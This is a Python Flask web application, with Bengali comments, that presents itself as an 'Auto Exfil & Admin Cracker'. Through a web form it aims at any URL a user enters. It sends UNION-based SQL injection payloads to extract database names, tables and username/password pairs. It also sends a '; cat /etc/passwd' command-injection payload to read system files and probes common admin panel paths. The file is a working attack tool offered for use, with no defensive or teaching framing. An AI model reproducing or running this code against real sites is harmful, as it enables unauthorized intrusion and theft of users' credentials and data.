from flask import Flask, render_template_string, request
import requests
import urllib.parse
import time
import re

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🖤 Auto Exfil & Admin Cracker</title>
    <style>
        body{background:#0a0e17;color:#00ffcc;font-family:monospace;padding:15px}
        .box{max-width:1000px;margin:auto;background:#111927;padding:25px;border-radius:15px}
        h1{text-align:center;color:#ff0044}
        input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:1px solid #334466;background:#0b111e;color:#c0d4ff;font-size:16px}
        button{background:#ff004422;border-color:#ff0044;cursor:pointer}
        .result{background:#0d1520;padding:15px;border-radius:8px;white-space:pre-wrap;color:#ffccbb;max-height:600px;overflow:auto;font-size:14px}
    </style>
</head>
<body>
<div class="box">
    <h1>🖤 Auto Exfil & Admin Cracker</h1>
    <form method="POST" action="/exfil">
        <input type="text" name="url" placeholder="http://target.com/page?id=1" required>
        <input type="text" name="param" placeholder="প্যারামিটার (যেমন: id)" value="id">
        <button type="submit">🚀 এক্সফিল শুরু করো</button>
    </form>
    {% if result %}
    <div class="result">{{ result|safe }}</div>
    {% endif %}
</div>
</body>
</html>
"""

# ===== ১. ডেটাবেস নাম বের =====
def get_database(url, param):
    payload = "' UNION SELECT database()-- -"
    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
    try:
        r = requests.get(test_url, timeout=3)
        # ডেটাবেস নাম খুঁজি (সাধারণত আউটপুটে দেখায়)
        match = re.search(r'[a-zA-Z0-9_]+', r.text)
        if match:
            return match.group(0)
    except:
        pass
    return None

# ===== ২. টেবিল লিস্ট =====
def get_tables(url, param, db):
    tables = []
    payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'-- -"
    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
    try:
        r = requests.get(test_url, timeout=3)
        # সব টেবিল নাম বের করি (আউটপুট থেকে)
        found = re.findall(r'[a-zA-Z_][a-zA-Z0-9_]*', r.text)
        if found:
            tables = found[:10]  # প্রথম ১০টি
    except:
        pass
    return tables

# ===== ৩. কলাম ও ডেটা =====
def get_data(url, param, table):
    data = []
    # ইউনিয়ন দিয়ে ডেটা বের করার চেষ্টা – ধরে নিচ্ছি ২টি কলাম
    payload = f"' UNION SELECT NULL, username, password FROM {table}-- -"
    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
    try:
        r = requests.get(test_url, timeout=3)
        # ক্রেডেনশিয়াল খুঁজি
        users = re.findall(r'([a-zA-Z0-9_]+):([a-zA-Z0-9_]+)', r.text)
        if users:
            for u,p in users:
                data.append(f"👤 ইউজার: {u} | পাস: {p}")
        else:
            # অন্য ফরম্যাটে খুঁজি
            lines = r.text.split('\n')
            for line in lines:
                if ':' in line or '|' in line:
                    data.append(line.strip())
    except:
        pass
    return data

# ===== ৪. কমান্ড ইনজেকশন দিয়ে ফাইল পড়ি =====
def read_file(url, param):
    payload = f"; cat /etc/passwd"
    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
    try:
        r = requests.get(test_url, timeout=3)
        if 'root:' in r.text:
            return r.text[:500]  # প্রথম ৫০০ অক্ষর
    except:
        pass
    return None

# ===== ৫. অ্যাডমিন প্যানেল ব্রুটফোর্স (ডিফল্ট) =====
def brute_admin(url):
    paths = ['/admin','/login','/wp-admin','/administrator','/panel','/dashboard']
    found = []
    for p in paths:
        try:
            r = requests.get(url.rstrip('/')+p, timeout=2)
            if r.status_code == 200:
                found.append(f"✅ অ্যাডমিন প্যানেল: {url.rstrip('/')+p}")
        except:
            pass
    return found

# ===== মেইন স্ক্যান =====
def full_exfil(target, param):
    out = []
    out.append("🖤 এক্সফিল শুরু...\n")

    # ডেটাবেস
    db = get_database(target, param)
    if db:
        out.append(f"📀 ডেটাবেস: {db}")
        tables = get_tables(target, param, db)
        if tables:
            out.append(f"\n📋 টেবিলসমূহ: {', '.join(tables)}")
            for table in tables:
                data = get_data(target, param, table)
                if data:
                    out.append(f"\n🔓 টেবিল: {table}")
                    out.extend(data)
        else:
            out.append("\n❌ টেবিল পাওয়া যায়নি (ইউনিয়ন কলাম সংখ্যা মেলাতে পারে না)")
    else:
        out.append("❌ ডেটাবেস নাম বের করতে ব্যর্থ (চেষ্টা করুন: ' UNION SELECT database()-- -)")

    # কমান্ড ইনজেকশন
    file_content = read_file(target, param)
    if file_content:
        out.append(f"\n📄 /etc/passwd (প্রথম ৫০০ অক্ষর):\n{file_content}")
    else:
        out.append("\n❌ ফাইল পড়া যায়নি (কমান্ড ইনজেকশন কাজ করছে না)")

    # অ্যাডমিন প্যানেল
    admins = brute_admin(target)
    if admins:
        out.append("\n🔐 অ্যাডমিন প্যানেল:")
        out.extend(admins)
    else:
        out.append("\n❌ কোনো অ্যাডমিন প্যানেল পাওয়া যায়নি")

    out.append("\n[✔] এক্সফিল সম্পূর্ণ।")
    return "\n".join(out)

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML, result=None)

@app.route('/exfil', methods=['POST'])
def exfil():
    url = request.form.get('url','').strip()
    param = request.form.get('param','id').strip()
    if not url:
        return render_template_string(HTML, result="❌ URL দিন")
    if not url.startswith(('http://','https://')):
        url = 'http://' + url
    res = full_exfil(url, param)
    return render_template_string(HTML, result=res)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)